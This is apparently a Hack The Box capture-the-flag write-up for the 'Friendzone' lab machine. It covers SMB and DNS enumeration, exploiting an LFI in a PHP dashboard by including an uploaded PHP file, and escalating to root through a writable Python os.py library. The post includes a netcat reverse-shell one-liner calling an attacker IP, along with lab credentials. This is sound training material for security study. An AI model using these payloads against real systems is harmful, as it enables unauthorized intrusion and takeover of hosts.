---
layout: post
title: Hack The Box - Friendzone
categories: hack-the-box
tags: [Linux, smb, Web, LFI, php, ssh, Python]
image: /hackthebox/friendzone/0.png
---

<hr>
### Quick Summary 
#### Hey guys today Friendzone retired and here's my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It's a Linux box and its ip is `10.10.10.123`, I added it to `/etc/hosts` as `friendzone.htb`. Let's jump right in !
![](/images/hackthebox/friendzone/0.png)
<hr>
### Nmap
#### As always we will start with `nmap` to scan for open ports and services :
`nmap -sV -sT friendzone.htb`
![](/images/hackthebox/friendzone/1.png)
#### Note : I didn't do a script scan (`-sC`) because for some reason it took a lot of time and didn't finish.
#### We got `ftp` on port 21, `ssh` on port 22, `dns` on port 53, `http` on port 80, `https` on port 443 and `smb`. Unfortunately anonymous login wasn't allowed on `ftp` :
```
root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb 
Connected to friendzone.htb.
220 (vsFTPd 3.0.3)
Name (friendzone.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```
#### Let's check `smb`.
<br>
<hr>
### SMB
#### I used `smbclient` to list the shares :
```
root@kali:~/Desktop/HTB/boxes/friendzone# smbclient --list friendzone.htb -U ""
Enter WORKGROUP\'s password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
```
#### I also used `smbmap` to know what permissions do I have : `smbmap -H friendzone.htb`.  I found that I had read access to `general` and read/write access to `Development`. I also noticed that the comment of the share `Files` discloses the path of that share : `/etc/Files`, so we can assume that all shares are in `/etc`.
#### In `general` I found a file called `creds.txt` :
```
root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/general -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 22:10:51 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

                9221460 blocks of size 1024. 6434016 blocks available
smb: \> get creds.txt 
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```
```
root@kali:~/Desktop/HTB/boxes/friendzone# cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
#### So we have credentials but we don't know where to use them, it says `creds for the admin THING`, so let's keep enumerating until we find that admin thing.
#### `Development` was just empty :
```
root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 12 13:17:50 2019
  ..                                  D        0  Wed Jan 23 23:51:02 2019
```
#### But since we have write access to that share and we know its path : `/etc/Development` then that share can help us later if we have a an `LFI` or a similar vulnerability.
<br>
<hr>
### HTTP and DNS
#### `http://friendzone.htb` :
![](/images/hackthebox/friendzone/2.png)
#### A static page, not really interesting, I noticed that email at the bottom : `info@friendzoneportal.red` so I added `friendzoneportal.red` to `/etc/hosts` :
![](/images/hackthebox/friendzone/3.png)
#### But `http://friendzoneportal.red` was just the same thing :
![](/images/hackthebox/friendzone/4.png)
#### I went back and added `friendzone.red` to the hosts file :
![](/images/hackthebox/friendzone/5.png)
#### But it was also the same thing. Then I remembered that there's a `dns` server so I used dig :
```
root@kali:~/Desktop/HTB/boxes/friendzone# dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.11.5-P4-3-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 402 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Fri Jul 12 13:22:51 EET 2019
;; XFR size: 8 records (messages 1, bytes 289)
```
#### now we have : `administrator1.friendzone.red`, `hr.friendzone.red` and `uploads.friendzone.red`. I edited the hosts file again :
![](/images/hackthebox/friendzone/6.png)
#### But I still got the same thing, I ran `gobuster` and got `/wordpress` which was empty :
![](/images/hackthebox/friendzone/7.png)
#### And `robots.txt` which wasn't a real `robots.txt` file :D
![](/images/hackthebox/friendzone/8.png)
#### There was another `https` port so I tried that.
#### `https://friendzone.red` :
![](/images/hackthebox/friendzone/9.png)
#### `https://administrator1.friendzone.red` :
![](/images/hackthebox/friendzone/10.png)
#### So this is the "administrator thing" let's try the credentials we have :
![](/images/hackthebox/friendzone/11.png)
<br>
<br>
![](/images/hackthebox/friendzone/12.png)
#### Great. `/dashboard.php` :
![](/images/hackthebox/friendzone/13.png)
<hr>
### LFI in dashboard.php, User Flag
#### As you can see it's complaining about missing parameters, by looking at the example : `image_id=a.jpg&pagename=timestamp` my first guess was that `dashboard.php` includes the `php` file provided in the `pagename` parameter. So if we give it `test` it will append `.php` to `test` then include that file. We can upload files to the `smb` share `Development` and we also know the full path : `/etc/Development`, so if it's really vulnerable to `LFI` we can get a reverse shell easily. I wrote a small `php` script to get a reverse shell :
```
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
?>
```
#### Then I uploaded it to `Development` :
```
root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> put rev.php 
putting file rev.php as \rev.php (0.3 kb/s) (average 0.3 kb/s)
smb: \> 
```
#### And finally I tested my idea :
`https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/rev`
![](/images/hackthebox/friendzone/14.png)
#### It worked and now we have a reverse shell as `www-data` :
![](/images/hackthebox/friendzone/15.png)
#### We owned user.
<br>
<hr>
### SSH as friend, Privilege Escalation
#### I looked into `/var/www` and found a file called `mysql_data.conf` which had some credentials :
```
$ ls -la
total 36
drwxr-xr-x  8 root root 4096 Oct  6  2018 .
drwxr-xr-x 12 root root 4096 Oct  6  2018 ..
drwxr-xr-x  3 root root 4096 Jan 16 22:13 admin
drwxr-xr-x  4 root root 4096 Oct  6  2018 friendzone
drwxr-xr-x  2 root root 4096 Oct  6  2018 friendzoneportal
drwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmin
drwxr-xr-x  3 root root 4096 Oct  6  2018 html
-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x  3 root root 4096 Oct  6  2018 uploads
$ cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
$
```
#### I could get `ssh` access as friend with them :
```
root@kali:~/Desktop/HTB/boxes/friendzone# ssh friend@friendzone.htb
The authenticity of host 'friendzone.htb (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'friendzone.htb,10.10.10.123' (ECDSA) to the list of known hosts.
friend@friendzone.htb's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                             

You have mail.
Last login: Fri Jul 12 14:26:57 2019 from 10.10.13.142
friend@FriendZone:~$ 
```
#### I did the regular enumeration and I ran [`pspy`](https://github.com/DominicBreuker/pspy) to monitor the processes to see if there's something that can be exploited :
![](/images/hackthebox/friendzone/16.png)
#### After some time I saw this :
![](/images/hackthebox/friendzone/17.png)
#### Root runs `/opt/server_admin/reporter.py`  from time to time.
```
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
#### So if we can write to that script then we can get a shell as root. Unfortunately we can't :
![](/images/hackthebox/friendzone/18.png)
#### But I noticed that it's importing the `os` library. Usually python libraries are only writable by root, but I checked `os.py` and friend had permissions to write to it :
```
friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
-rw-rw-r--  1 friend friend    476 Jul 12 14:39 os.py
-rw-r--r--  1 root   root     1187 Jul 12 14:40 os.pyc
-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
```
#### So I just put those two lines at the bottom of `os.py` :
![](/images/hackthebox/friendzone/19.png)
#### And after a minute I got a shell :
![](/images/hackthebox/friendzone/20.png)
#### And we owned root !
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter for awesome resources [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### Previous Hack The Box write-up : [Hack The Box - Hackback](/hack-the-box/hackback/)
<hr>
